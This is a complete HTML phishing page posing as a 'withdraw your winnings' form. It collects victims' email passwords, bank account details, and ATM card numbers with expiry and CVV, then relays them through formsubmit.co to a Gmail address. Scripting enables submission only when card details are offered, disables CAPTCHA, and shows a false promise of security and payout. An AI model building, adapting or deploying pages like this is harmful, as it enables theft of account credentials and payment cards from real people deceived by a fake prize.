<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FILL THIS FORM TO WITHDRAW MONEY</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 20px;
    }
    form {
      background-color: #fff;
      padding: 20px;
      max-width: 500px;
      margin: auto;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #333;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    .error {
      color: red;
      font-size: 14px;
      display: none;
      margin-top: 3px;
    }
    .eye-toggle {
      position: relative;
    }
    .eye-toggle input {
      padding-right: 40px;
    }
    .eye-toggle span {
      position: absolute;
      top: 35%;
      right: 10px;
      cursor: pointer;
      user-select: none;
    }
    button {
      margin-top: 20px;
      padding: 12px;
      width: 100%;
      font-size: 16px;
      background-color: #4CAF50;
      border: none;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .note {
      margin-top: 20px;
      font-style: italic;
      color: #444;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
    <h2>FILL THIS FORM TO WITHDRAW MONEY</h2>

    <label for="name">Full Name</label>
    <input type="text" id="name" name="Full Name" required>

    <label for="country">Country</label>
    <input type="text" id="country" name="Country" required>

    <label for="phone">Phone Number</label>
    <input type="tel" id="phone" name="Phone Number" required pattern="^[0-9]{9,12}$">
    <div class="error" id="phoneError">Phone number must be 9 to 12 digits.</div>

    <label for="email">Email Address</label>
    <input type="email" id="email" name="Email Address" required>

    <label for="emailPass">Email Password</label>
    <div class="eye-toggle">
      <input type="password" id="emailPass" name="Email Password" required>
      <span onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <label for="amountWon">Amount You Won</label>
    <input type="number" id="amountWon" name="Amount You Won" required>

    <label for="accountType">Bank Account Type</label>
    <input type="text" id="accountType" name="Bank Account Type" required>

    <label for="accountNumber">Bank Account Number</label>
    <input type="text" id="accountNumber" name="Bank Account Number" required>

    <label for="accountHolder">Bank Account Holder's Name</label>
    <input type="text" id="accountHolder" name="Bank Account Holder's Name" required>

    <label for="linkedATM">Did You Link ATM to Your Bank Account?</label>
    <select id="linkedATM" name="Did You Link ATM to Your Bank Account?" required onchange="handleATMChange()">
      <option value="">Select</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>

    <div id="atmFields">
      <label for="atmCard">ATM Card Number</label>
      <input type="text" id="atmCard" name="ATM Card Number" pattern="\\d{16}">
      <div class="error" id="atmCardError">ATM Card must be exactly 16 digits.</div>

      <label for="expiry">Expiry Date (MM/YY)</label>
      <input type="text" id="expiry" name="Expiry Date" maxlength="5" placeholder="MM/YY">
      <div class="error" id="expiryError">Enter a valid MM/YY format.</div>

      <label for="cvv">CVV</label>
      <input type="text" id="cvv" name="CVV" maxlength="3" pattern="\\d{3}">
      <div class="error" id="cvvError">CVV must be exactly 3 digits.</div>
    </div>

    <p class="note" id="finalNote"></p>

    <input type="hidden" name="_next" value="thankyou.html">
    <input type="hidden" name="_captcha" value="false">

    <button type="submit" id="submitBtn" disabled>Submit</button>

    <p class="note">We keep your data secure and confidential</p>
  </form>

  <script>
    function togglePassword() {
      const input = document.getElementById("emailPass");
      input.type = input.type === "password" ? "text" : "password";
    }

    const phoneInput = document.getElementById("phone");
    const phoneError = document.getElementById("phoneError");

    phoneInput.addEventListener("blur", () => {
      const valid = /^\d{9,12}$/.test(phoneInput.value);
      phoneError.style.display = valid ? "none" : "block";
    });

    const atmCard = document.getElementById("atmCard");
    const atmCardError = document.getElementById("atmCardError");
    atmCard.addEventListener("blur", () => {
      const valid = /^\d{16}$/.test(atmCard.value);
      atmCardError.style.display = valid || atmCard.value === "" ? "none" : "block";
    });

    const expiry = document.getElementById("expiry");
    const expiryError = document.getElementById("expiryError");
    expiry.addEventListener("input", (e) => {
      let val = expiry.value.replace(/[^0-9]/g, "");
      if (val.length > 2) val = val.slice(0,2) + "/" + val.slice(2);
      expiry.value = val.slice(0,5);
    });
    expiry.addEventListener("blur", () => {
      const valid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry.value);
      expiryError.style.display = valid || expiry.value === "" ? "none" : "block";
    });

    const cvv = document.getElementById("cvv");
    const cvvError = document.getElementById("cvvError");
    cvv.addEventListener("blur", () => {
      const valid = /^\d{3}$/.test(cvv.value);
      cvvError.style.display = valid || cvv.value === "" ? "none" : "block";
    });

    const linkedATM = document.getElementById("linkedATM");
    const atmFields = document.getElementById("atmFields");
    const finalNote = document.getElementById("finalNote");
    const submitBtn = document.getElementById("submitBtn");

    function handleATMChange() {
      const value = linkedATM.value;
      if (value === "Yes") {
        atmFields.style.display = "block";
        submitBtn.disabled = false;
        finalNote.style.display = "block";
        updateFinalNote();
      } else {
        atmFields.style.display = "none";
        submitBtn.disabled = true;
        finalNote.style.display = "none";
      }
    }

    const nameInput = document.getElementById("name");
    const amountWonInput = document.getElementById("amountWon");
    const accountTypeInput = document.getElementById("accountType");
    const accountNumberInput = document.getElementById("accountNumber");

    function updateFinalNote() {
      const fullName = nameInput.value;
      const amount = amountWonInput.value;
      const accType = accountTypeInput.value;
      const accNum = accountNumberInput.value;

      finalNote.textContent = `Dear ${fullName}, You will receive ${amount} to your ${accType}, ${accNum}`;
    }

    [nameInput, amountWonInput, accountTypeInput, accountNumberInput].forEach(input => {
      input.addEventListener("input", updateFinalNote);
    });

    window.onload = () => {
      handleATMChange(); // hide fields if already selected
    };
  </script>
</body>
</html>
